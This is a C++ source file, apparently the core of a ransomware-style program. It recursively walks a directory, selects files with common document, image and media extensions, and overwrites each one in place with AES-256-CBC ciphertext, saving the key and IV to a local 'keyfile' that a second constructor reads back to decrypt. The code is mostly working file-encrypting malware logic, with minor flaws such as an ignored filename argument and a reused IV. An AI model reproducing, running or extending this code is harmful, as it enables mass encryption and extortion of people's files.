#include <cstdlib>
#include <cstring>
#include <string>
#include <fstream>
#include <iostream>

extern "C" {
#include <ftw.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <openssl/bio.h>
}

#include "encrypt.h"

std::string extensions[] = {".jpg", ".gif", ".jpeg", ".png", ".doc", ".docx", ".xls",
      ".xlsx", ".ppt", ".pptx", ".mp3", ".mp4", ".pdf", ".txt"};
const int extensionsSize = 14;
const int descriptors = 10;

Crypt *Crypt::current = NULL;

int Crypt::encryptDir(const char *name, const struct stat *stats, int flag, struct FTW *path) {
	Crypt::current->shouldEncrypt(name, flag, path);
	return 0;
}

void Crypt::handleErrors(int error) {
	if (!error) {
		ERR_print_errors_fp(stderr);
		exit(EXIT_FAILURE);
	}
}

// Should probably set iv per file
void Crypt::encryptFile(const char *name) {
	FILE *inFile, *outFile;
	int inLen, outLen;
	BIO *out, *cipher;
	unsigned char text[BLOCK_SIZE];

	inFile = fopen(name, "rb+");
	outFile = tmpfile();
    out = BIO_new_fp(outFile, BIO_NOCLOSE);
    cipher = BIO_new(BIO_f_cipher());
    BIO_set_cipher(cipher, EVP_aes_256_cbc(), key, iv, enc);
    BIO_push(cipher, out);

	while (!feof(inFile)) {
		inLen = fread(text, 1, BLOCK_SIZE, inFile);
        BIO_write(cipher, text, inLen);
	}

    BIO_flush(cipher);
    BIO_free_all(cipher);
	inFile = freopen(NULL, "wb", inFile);
	rewind(outFile);

	while(!feof(outFile)) {
		inLen = fread(text, 1, BLOCK_SIZE, outFile);
		fwrite(text, 1, inLen, inFile);
	}

	fclose(inFile);
	fclose(outFile);
}

void Crypt::shouldEncrypt(const char *name, int flag, struct FTW *path) {
	const char *extension = strrchr(name + path->base, '.');

	if (extension) {
		for (int i = 0; i < extensionsSize; i++) {
			if (extension == extensions[i] && flag == FTW_F) {
				encryptFile(name);
				return;
			}
		}
	}
}

int Crypt::encryptFiles(const char *dir) {
	int err = nftw(dir, Crypt::encryptDir, descriptors, 0);
    std::ofstream keyfile("keyfile");

    keyfile.write((const char*)key, KEY_SIZE).write((const char*)iv, BLOCK_SIZE);
    if (keyfile.fail()) {
        std::cerr << "Failed to write key and iv" << std::endl;
        exit(EXIT_FAILURE);
    }

	return err;
}

Crypt::Crypt() {
	handleErrors(RAND_bytes(key, KEY_SIZE));
	handleErrors(RAND_bytes(iv, BLOCK_SIZE));

	enc = 1;

	Crypt::current = this;
}

Crypt::Crypt(char *keyfileName) {
    std::ifstream keyfile("keyfile");

    keyfile.read((char*)key, KEY_SIZE).read((char*)iv, BLOCK_SIZE);
    if (keyfile.fail()) {
        std::cerr << "Failed to read key and iv" << std::endl;
        exit(EXIT_FAILURE);
    }

	enc = 0;

	Crypt::current = this;
}
